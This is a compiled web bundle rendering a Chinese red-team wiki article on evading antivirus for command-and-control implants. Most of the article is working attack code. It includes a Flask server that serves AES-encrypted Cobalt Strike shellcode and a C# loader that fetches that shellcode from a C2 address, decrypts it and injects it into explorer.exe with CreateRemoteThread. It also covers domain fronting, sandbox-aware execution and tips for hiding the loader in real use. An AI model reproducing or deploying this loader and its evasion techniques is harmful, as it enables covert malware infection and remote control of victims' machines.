(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[15],{157:function(e,n,t){"use strict";t.r(n),function(e){t.d(n,"default",(function(){return i}));var a,c=t(95),o=(t(139),t(0),t(96));function s(){return(s=Object.assign||function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var a in t)Object.prototype.hasOwnProperty.call(t,a)&&(e[a]=t[a])}return e}).apply(this,arguments)}function r(e,n){if(null==e)return{};var t,a,c=function(e,n){if(null==e)return{};var t,a,c={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(c[t]=e[t]);return c}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(c[t]=e[t])}return c}(a="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&a(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var p,l,b=function(e){return function(n){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(o.b)("div",n)}},m={},d="wrapper";function i(e){var n=e.components,t=r(e,["components"]);return Object(o.b)(d,s({},m,t,{components:n,mdxType:"MDXLayout"}),Object(o.b)("h1",{className:"__internal",id:"cc免杀对抗多维度分析"},"C&C免杀对抗多维度分析",Object(o.b)("a",s({parentName:"h1"},{href:"#cc%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97%E5%A4%9A%E7%BB%B4%E5%BA%A6%E5%88%86%E6%9E%90","aria-hidden":!0,className:"anchor"}),"#")),Object(o.b)("p",null,Object(o.b)("strong",{parentName:"p"},"查杀方式")),Object(o.b)("blockquote",null,Object(o.b)("p",{parentName:"blockquote"},"文件查杀（Signatured Static Scanning）\n内存扫描（Run-time Analysis）\n流量分析（NIPS/NIDS）\n行为分析（behavior Monitoring）")),Object(o.b)("p",null,Object(o.b)("strong",{parentName:"p"},"对抗-静态扫描（文件查杀）")),Object(o.b)("p",null,"1、shellcode加密（XOR、AES）"),Object(o.b)("p",null,"避免被杀软直接获取到真正shellcode（因为性能等原因 杀软不会暴力枚举解密内容）"),Object(o.b)("p",null,"2、源码级免杀（自主研发C&C工具）"),Object(o.b)("p",null,Object(o.b)("strong",{parentName:"p"},"对抗-内存扫描")),Object(o.b)("p",null,"各种语言自定义加载器，比如使用C# 编写ShellCode Loader"),Object(o.b)("p",null,"运行机制不同（C#使用虚拟机解释后运行，Golang编译运行）杀软没足够精力跟进各种形式的加载器"),Object(o.b)("p",null,Object(o.b)("strong",{parentName:"p"},"对抗-流量分析")),Object(o.b)("p",null,"域前置 - Domain Fronting"),Object(o.b)("p",null," 流量路径",Object(o.b)("inlineCode",{parentName:"p"},"CDN->IP->c2")),Object(o.b)("p",null,Object(o.b)("strong",{parentName:"p"},"对抗-行为分析")),Object(o.b)("p",null,"指定特定的运行条件，符合条件才执行恶意操作；避免在沙箱、逆向分析时有明显的恶意行为。"),Object(o.b)("p",null,"适合指定某个重要目标的情况下使用，比如要拿域内的某台重要靶标。"),Object(o.b)("p",null,"或者可以加强壳，例如VMP"),Object(o.b)("h1",{className:"__internal",id:"一、shellcode加密"},"一、shellcode加密",Object(o.b)("a",s({parentName:"h1"},{href:"#%E4%B8%80%E3%80%81shellcode%E5%8A%A0%E5%AF%86","aria-hidden":!0,className:"anchor"}),"#")),Object(o.b)("p",null,"推荐一个脚本：",Object(o.b)("a",s({parentName:"p"},{href:"https://github.com/rvrsh3ll/CPLResourceRunner",target:"_blank"}),"https://github.com/rvrsh3ll/CPLResourceRunner")," "),Object(o.b)("p",null,"可以把CS生成的RAW的beacon.bin转成shellcode"),Object(o.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(o.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(o.b)("code",s({parentName:"pre"},{className:"language-bash"}),"python2 ConvertShellcode.py beacon.bin"))),Object(o.b)("p",null,Object(o.b)("strong",{parentName:"p"},"服务端：Python Flask动态加密Shellcode")),Object(o.b)("div",{className:"rcpress-highlight","data-language":"python"},Object(o.b)("pre",s({parentName:"div"},{className:"language-python"}),Object(o.b)("code",s({parentName:"pre"},{className:"language-python"}),Object(o.b)("span",s({parentName:"code"},{className:"token comment"}),"#服务端起个Flask动态加密，__init__.py"),"\n",Object(o.b)("span",s({parentName:"code"},{className:"token comment"}),"#coding=utf-8"),"\n",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"import")," base64\n",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," Crypto",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"Cipher ",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"import")," AES\n",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," Crypto",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"Util",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"Padding ",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"import")," pad",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," unpad\n",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"from")," flask ",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"import")," Flask\n\n",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"def")," ",Object(o.b)("span",s({parentName:"code"},{className:"token function"}),"add_to_32"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"key",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),"\n    ",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"while")," ",Object(o.b)("span",s({parentName:"code"},{className:"token builtin"}),"len"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"key",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")," ",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"%")," ",Object(o.b)("span",s({parentName:"code"},{className:"token number"}),"32")," ",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"!=")," ",Object(o.b)("span",s({parentName:"code"},{className:"token number"}),"0"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),"\n        key ",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"+=")," ",Object(o.b)("span",s({parentName:"code"},{className:"token string"}),"'\\0'"),"\n    ",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"return")," ",Object(o.b)("span",s({parentName:"code"},{className:"token builtin"}),"str"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"encode",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"key",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"  ",Object(o.b)("span",s({parentName:"code"},{className:"token comment"}),"# 返回bytes,密钥不是32位就不全"),"\n\n",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"def")," ",Object(o.b)("span",s({parentName:"code"},{className:"token function"}),"create_app"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),"\n    ",Object(o.b)("span",s({parentName:"code"},{className:"token comment"}),"# create and configure the app"),"\n    app ",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," Flask",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"__name__",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," instance_relative_config",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(o.b)("span",s({parentName:"code"},{className:"token boolean"}),"True"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n    @app",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"route",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(o.b)("span",s({parentName:"code"},{className:"token string"}),"'/<string:key>'"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," methods",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(o.b)("span",s({parentName:"code"},{className:"token string"}),"'GET'"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," ",Object(o.b)("span",s({parentName:"code"},{className:"token string"}),"'POST'"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n    ",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"def")," ",Object(o.b)("span",s({parentName:"code"},{className:"token function"}),"AES_Encrypt"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"key",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),":"),"\n        BLOCK_SIZE ",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," ",Object(o.b)("span",s({parentName:"code"},{className:"token number"}),"32"),"  ",Object(o.b)("span",s({parentName:"code"},{className:"token comment"}),"# Bytes"),"\n        f ",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," ",Object(o.b)("span",s({parentName:"code"},{className:"token builtin"}),"open"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(o.b)("span",s({parentName:"code"},{className:"token string"}),"'./shellcode.txt'"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," ",Object(o.b)("span",s({parentName:"code"},{className:"token string"}),"'r'"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\t",Object(o.b)("span",s({parentName:"code"},{className:"token comment"}),"#从CS导出的C#格式的shellcode，放在Fask应用根目录"),"\n        shellcode ",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," f",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"read",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n        cipher ",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," AES",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"new",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"add_to_32",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"key",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," AES",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"MODE_ECB",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n        encrypted ",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," cipher",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"encrypt",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"pad",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"shellcode",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"encode",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),Object(o.b)("span",s({parentName:"code"},{className:"token string"}),"'utf-8'"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),","),"BLOCK_SIZE",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n        encrypted_text ",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," ",Object(o.b)("span",s({parentName:"code"},{className:"token builtin"}),"str"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"base64",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"."),"encodebytes",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"encrypted",Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),",")," encoding",Object(o.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(o.b)("span",s({parentName:"code"},{className:"token string"}),"'utf-8'"),Object(o.b)("span",s({parentName:"code"},{className:"token punctuation"}),")"),"\n        ",Object(o.b)("span",s({parentName:"code"},{className:"token comment"}),"#加密结果用base64编码"),"\n        ",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"return")," encrypted_text\n    ",Object(o.b)("span",s({parentName:"code"},{className:"token keyword"}),"return")," app"))),Object(o.b)("h1",{className:"__internal",id:"二、c编写loader"},"二、C#编写Loader",Object(o.b)("a",s({parentName:"h1"},{href:"#%E4%BA%8C%E3%80%81c%E7%BC%96%E5%86%99loader","aria-hidden":!0,className:"anchor"}),"#")),Object(o.b)("p",null,Object(o.b)("strong",{parentName:"p"},"客户端：Loder从网络加载Shellcode（随机生成key去请求shellcode） -> 解密 -> 创建进程 运行上线")),Object(o.b)("div",{className:"rcpress-highlight","data-language":"c#"},Object(o.b)("pre",s({parentName:"div"},{className:"language-c#"}),Object(o.b)("code",s({parentName:"pre"},{className:"language-c#"}),'//WLoader C#\nusing System;\nusing System.Security.Cryptography;\nusing System.IO;\nusing System.Net;\nusing System.Text;\nusing System.Runtime.InteropServices;\nusing System.Collections.Generic;\nusing System.Linq;\nusing System.Diagnostics;\n\nnamespace Wloader\n{\n    class Program\n    {\n        // Used to Load Shellcode into Memory:\n        private static UInt32 MEM_COMMIT = 0x1000;\n        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\n        [DllImport("kernel32.dll")] //声明API函数\n        public static extern int VirtualAllocEx(\n            IntPtr hProcess, //进程的句柄.该函数在此进程的虚拟地址空间内分配内存\n            int lpAddress,//该指针为要分配的页面区域指定所需的起始地址\n            UInt32 dwSize,//要分配的内存区域的大小，以字节为单位\n            UInt32 flAllocationType,//内存分配的类型 ,MEM_COMMIT为指定的保留内存页面分配内存\n            UInt32 flProtect);//对要分配的页面区域的内存保护,PAGE_EXECUTE_READWRITE\n        //该地址必须是页面属性为PAGE_EXECUTE_READWRITE的页面）或者其他宿主进程能执行地方（如共享内存映射区）\n\n        [DllImport("kernel32.dll")]\n        public static extern int WriteProcessMemory(\n            IntPtr hProcess,    //要修改的过程存储器的句柄\n            int lpBaseAddress, //指向要写入数据的指定进程中的基地址的指针\n            byte[] lpBuffer, //指向缓冲区的指针，该缓冲区包含要在指定进程的地址空间中写入的数据\n            int nSize,//要写入指定进程的字节数 \n            int lpNumberOfBytesWritten);//指向变量的指针，该变量接收传输到指定进程中的字节数;(可选)为NULL则忽略\n\n        [DllImport("kernel32.dll")]\n        public static extern int GetProcAddress(int hwnd, string lpname);\n\n        [DllImport("kernel32.dll")]\n        public static extern int GetModuleHandleA(string name);\n\n        [DllImport("kernel32.dll")]\n        private static extern IntPtr CreateRemoteThread(\n            IntPtr hProcess,//目标进程的句柄\n            UInt32 lpThreadAttributes, //指向线程的安全描述结构体的指针，一般设置为NULL，表示默认安全级别\n            UInt32 dwStackSize,//线程堆栈大小，一般设置为0，表示使用默认大小\n            UInt32 lpStartAddress,//线程函数的地址\n            IntPtr lpParameter,//线程参数\n            UInt32 dwCreationFlags,//线程的创建方式，CREATE_SUSPENDED 线程以挂起方式创建\n            ref UInt32 lpThreadId); //输出参数，记录创建的远程线程的ID\n        \n\n        [DllImport("kernel32")]\n        private static extern UInt32 WaitForSingleObject(\n          IntPtr hHandle,\n          UInt32 dwMilliseconds\n        );\n\n        public static string key;\n\n\n\n        //随机生成32位密钥\n        public static void NewKey()\n        {\n            key = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 32);\n        }\n        //请求获取shellcode内容\n        public static string GetShell(string url)\n        {\n            url = url + key;\n            HttpWebRequest reqContent = (HttpWebRequest)WebRequest.Create(url);//这个是请求的登录接口\n            reqContent.Method = "GET";\n            reqContent.AllowAutoRedirect = true;//服务端重定向。一般设置false\n            reqContent.Timeout = 5000;\n            HttpWebResponse respContent = (HttpWebResponse)reqContent.GetResponse();\n            StreamReader sr = new StreamReader(respContent.GetResponseStream());\n            return sr.ReadToEnd();\n\n        }\n\n        //AES解密\n        public static string AesDecrypt(string message, string key)\n        {\n            using (AesCryptoServiceProvider aesProvider = new AesCryptoServiceProvider())\n            {\n                aesProvider.Key = Encoding.UTF8.GetBytes(key);\n                aesProvider.Mode = CipherMode.ECB;\n                aesProvider.Padding = PaddingMode.None;\n                using (ICryptoTransform cryptoTransform = aesProvider.CreateDecryptor())\n                {\n                    byte[] inputBuffers = Convert.FromBase64String(message);\n                    byte[] results = cryptoTransform.TransformFinalBlock(inputBuffers, 0, inputBuffers.Length);\n                    aesProvider.Clear();\n                    string rs = Encoding.UTF8.GetString(results);\n                    rs = rs.Replace("", null);\n                    rs = rs.Replace("", null);\n                    rs = rs.Replace(" ", null);\n                    return rs;\n                }\n            }\n        }\n       \n    public static void runShell(string shellcodes)\n        {\n            string[] strings = shellcodes.Split(\',\');\n            byte[] shellcode = new byte[strings.Length];\n            //逐个字符变为16进制字节数据\n            for (int i = 0; i < strings.Length; i++)\n            {\n                shellcode[i] = Convert.ToByte(strings[i], 16);\n            }\n            Console.WriteLine(strings.Length);\n            try\n            {\n\n                Process[] pname = Process.GetProcesses(); //取得所有进程\n                foreach (Process name in pname)\n                {\n                    if (name.ProcessName.ToLower().IndexOf("explorer") != -1)//注入到资源管理器中\n                    {\n                        IntPtr hThread = IntPtr.Zero;\n                        UInt32 threadId = 0;\n                        IntPtr pinfo = IntPtr.Zero;\n\n                        UInt32 funcAddr = (uint)VirtualAllocEx(name.Handle, 0, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n                        //在宿主进程中申请一块存储区域\n\n                        WriteProcessMemory(name.Handle, (int)funcAddr, shellcode, shellcode.Length, 0);\n                        //通过WriteProcessMemory函数将线程代码写入宿主进程中（替换上边的）\n\n                        /*threadId = GetProcAddress(GetModuleHandleA("Kernel32"), "LoadLibraryA");*/\n                        //取得loadlibrary在kernek32.dll地址\n\n                        hThread = CreateRemoteThread(name.Handle, 0, 0, funcAddr, pinfo, 0, ref threadId);\n                        WaitForSingleObject(hThread, 0xFFFFFFFF);\n                        Console.WriteLine("执行完毕，Success");\n                    }\n                }\n            }\n            catch (Exception e)\n            {\n                Console.Error.WriteLine("exception: " + e.Message);\n            }\n        }\n        static void Main(string[] args)\n        {\n            NewKey();//生成32位的密钥key\n            string shellcode = GetShell("http://192.168.1.103:5000/");//从HTTP服务器获取加密的Shellcode\n            shellcode = AesDecrypt(shellcode, key);//这里就得到了动态加解密后的shellcode\n            //Console.WriteLine(shellcode);//输出测试\n\n            //接下来注入到进程\n            runShell(shellcode);\n        }\n    }\n}\n'))),Object(o.b)("p",null,Object(o.b)("strong",{parentName:"p"},"成功上线")),Object(o.b)("p",null,Object(o.b)("img",s({parentName:"p"},{src:"/images/ss.png",alt:null}))),Object(o.b)("p",null,Object(o.b)("strong",{parentName:"p"},"杀软扫描")),Object(o.b)("p",null,Object(o.b)("img",s({parentName:"p"},{src:"/images/image-20200725203712920.png",alt:null}))),Object(o.b)("p",null,Object(o.b)("img",s({parentName:"p"},{src:"/images/image-20200725204100044.png",alt:null}))),Object(o.b)("p",null,Object(o.b)("img",s({parentName:"p"},{src:"/images/image-20200725204247935.png",alt:null}))),Object(o.b)("p",null,Object(o.b)("strong",{parentName:"p"},"最后注意！！！")),Object(o.b)("p",null,"我写代码的时候机器开着火绒呢，一开始我用的CreateThread直接给我干掉了;"),Object(o.b)("p",null,"后来改成CreateRemoteThread，火绒还是能识别出木马释放程序；"),Object(o.b)("p",null,"解决方法：1、再找其它可以替代的函数； 2、寻找新的注入方式"),Object(o.b)("p",null,"还有就是我这次做实验的时候太奔放了，全程开着杀软网没断；"),Object(o.b)("p",null,"正确的做法是更新完杀软然后断网，创建虚拟机快照，测完后恢复快照；"),Object(o.b)("p",null,"否则杀软会镜像流量，等下次开机样本就会被上传出去。"),Object(o.b)("blockquote",null,Object(o.b)("p",{parentName:"blockquote"},"这个加载器运行时会弹一个黑框输出shellcode的长度，实际使用记得修改为不让它弹窗")),Object(o.b)("h1",{className:"__internal",id:"三、使用域前置"},"三、使用域前置",Object(o.b)("a",s({parentName:"h1"},{href:"#%E4%B8%89%E3%80%81%E4%BD%BF%E7%94%A8%E5%9F%9F%E5%89%8D%E7%BD%AE","aria-hidden":!0,className:"anchor"}),"#")),Object(o.b)("p",null,"由于是测试，跳过了这一步，直接用了C2的IP"),Object(o.b)("p",null,"域前置方法参考以下链接："),Object(o.b)("p",null,Object(o.b)("a",s({parentName:"p"},{href:"https://www.anquanke.com/post/id/195011",target:"_blank"}),"https://www.anquanke.com/post/id/195011")," "),Object(o.b)("blockquote",null,Object(o.b)("p",{parentName:"blockquote"},"另外CS的Profie也要自己修改一下特征")))}i.isMDXComponent=!0,i=Object(c.hot)(e)(i),(p="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(p.register(b,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\cc.md"),p.register(m,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\cc.md"),p.register(d,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\cc.md"),p.register(i,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\cc.md")),(l="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&l(e)}.call(this,t(23)(e))}}]);